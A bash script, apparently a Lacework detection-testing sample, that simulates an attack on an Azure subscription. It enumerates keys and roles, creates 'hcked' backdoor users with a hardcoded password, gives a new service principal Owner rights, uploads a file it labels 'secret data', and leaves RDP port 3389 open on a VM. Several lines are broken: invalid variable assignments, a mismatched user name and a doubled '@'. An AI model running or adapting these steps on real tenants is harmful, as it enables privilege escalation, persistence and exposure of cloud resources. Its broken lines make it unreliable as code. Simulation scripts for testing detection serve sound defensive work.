#!/bin/bash
# Lacework sample Azure exploit
# Creates a new service account user with editor privileges for the specified project_id, then creates a Azure storage bucket and puts a file into it.
# The script then cleans up after itself, deleting the bucket and the user.
# Accepts an optional argument for the username that gets created, otherwise defaults to 'system'
set -a

red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'

curl https://ipinfo.io/ip
curl https://ipinfo.io/ip
curl https://ipinfo.io/ip


usage="$(basename "$0") [-s <Subscription ID>]

This is a script to simulate a malicious execution event in a Azure environment.

Arguments:
    -h  show this help text
    -s  (optional) supply the subscription id (otherwise default subscription is used)
    -l  (optional) log output location (file), defaults to /dev/null
"

while getopts 'hs:l:' option; do
  case "$option" in
    h) echo "$usage"
       exit
       ;;
    :) printf "Missing argument for -%s\n" "$OPTARG" >&2
       echo "$usage" >&2
       exit 1
       ;;
    s) SUBSCRIPTION=${OPTARG}
       ;;
    l) LOG=${OPTARG}
       ;;
   \?) printf "Illegal option: -%s\n" "$OPTARG" >&2
       echo "$usage" >&2
       exit 1
       ;;
  esac
done

function sleepFor () {
  echo "${cyn}=> sleeping $1...${end}"
  sleep $1
}

function log () {
  echo "${grn}==> $1${end}"
}

if [ -z $LOG ]; then
  LOG=/dev/null
fi

# verify az cli is logged in
az account list &> $LOG
if [ $? -ne 0 ]; then
  log "az cli must be authenticated and working"
  exit 1
fi

# Set the active script subscription
az account set --subscription $SUBSCRIPTION
if [ $? -ne 0 ]; then
  log "cannot enable correct subscription"
  exit 1
fi

# Confirm subscription is right
SUB=$(az account show|jq -r '.id')
if [ $SUB != $SUBSCRIPTION ]; then
  log "incorrect subscription enabled, found [${SUB}], expected [${SUBSCRIPTION}]"
  exit 1
fi


# Listing storage account keys
log "listing all the things"
RND = tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo
az account list || true
az account tenant list || true
az account subscription list || true
az account subscription list || true
az ad user create --display-name hcked$RND --password r123klasdfoaui1mnoiasufjk1lk1kljkljdfs --user-principal-name hcked$RND@laceworktest.onmicrosoft.com --force-change-password-next-login false || true
USER_ID = az ad user show --id hcked-$RND@@laceworktest.onmicrosoft.com --query objectId --out tsv || true
az ad group member add --group hckedgroupname$RND --member-id $USER_ID || true
az ad app create --display-name hckedappname$RND || true

az ad signed-in-user show || true
az ad signed-in-user list-owned-objects || true
az account management-group list || true

# Listing storage account keys
log "listing all the things"
az storage account keys list  || true
az aks list  || true
az account list  || true
az account subscription list  || true
az role definition list  || true
az purview account list  || true
az vm list --output table  || true

# Set a name to use for all resources
NAMEFORALL=pwnd$RANDOM

# Create a new SP
log "creating a new azure service principal (sp)"

SPNAME=$NAMEFORALL
if [ -z $SUBSCRIPTION ]; then
  SUBSCRIPTION=$(az account list -o json 2>$LOG | jq '.[] | select(.isDefault == true)|.id')
fi

SP_DETAILS=$(az ad sp create-for-rbac --role="Contributor" --scope "/subscriptions/${SUBSCRIPTION}" --name $SPNAME 2>$LOG)
sleepFor 10
log "created new sp: ${SPNAME}"

# Setup way to much access for SP
APPID=$(echo $SP_DETAILS|jq -r '.appId')
PASSWORD=$(echo $SP_DETAILS|jq -r '.password')
TENANT=$(echo $SP_DETAILS|jq -r '.tenant')

log "assigning sp ${SPNAME} owner rights"
az role assignment create --role "Owner" --assignee $APPID &> $LOG
az role assignment create --role "Storage Blob Data Contributor" --assignee $APPID &> $LOG
sleepFor 10

# Switch to SP
log "switching to sp context"
TMP_LOCATION=$(dirname $(mktemp -u))
SP_CONFIG_DIR="${TMP_LOCATION}/azure${RANDOM}"
mkdir $SP_CONFIG_DIR
export AZURE_CONFIG_DIR=$SP_CONFIG_DIR
az login --service-principal -u "${APPID}" -p "${PASSWORD}" --tenant "${TENANT}" &> $LOG
sleepFor 3

# Create a new RG for easy removal
log "creating a new azure resource group..."
LOCATION="eastus"
RGNAME=$NAMEFORALL
az group create --name $RGNAME --location $LOCATION &> $LOG

# Create a new storage account
log "creating a new azure storage account & container and uploading a file..."
CONTAINER=$NAMEFORALL
az storage account create \
  --name $CONTAINER \
  --resource-group $RGNAME \
  --location $LOCATION \
  --sku Standard_ZRS \
  --encryption-services blob &> $LOG
az storage container create \
  -n $CONTAINER \
  --account-name $CONTAINER \
  --auth-mode login &> $LOG
sleepFor 15

# Download a really funny joke...
curl -s -H "Accept: application/json" https://icanhazdadjoke.com/ > badfile.json

# Upload to container
log "uploading secret data..."
az storage blob upload --account-name $CONTAINER \
    --container-name $CONTAINER \
    --name igotjokes.txt \
    --file badfile.json \
    --auth-mode login &> $LOG

log "data uploaded. preparing to destroy..."
sleepFor 5

log "deleting file and Azure Storage bucket..."
az group delete --name $RGNAME --no-wait --yes &> $LOG
rm badfile.json

# Exit back out to our regular context
log "switch back from SP context"
unset AZURE_CONFIG_DIR

# Remove new sp
log "deleting sp..."
az ad sp delete --id $APPID &> $LOG

# Open port 3389 worker vm
log "Opening port 3389 on windows work vm..."
VM_NAME="voteapp-worker"
RESOURCE_GROUP="voteapp-worker-rg"
az vm open-port --resource-group $RESOURCE_GROUP --name $VM_NAME --port 3389 --priority 989

log "script complete. check your Lacework console for activity in about an hour"
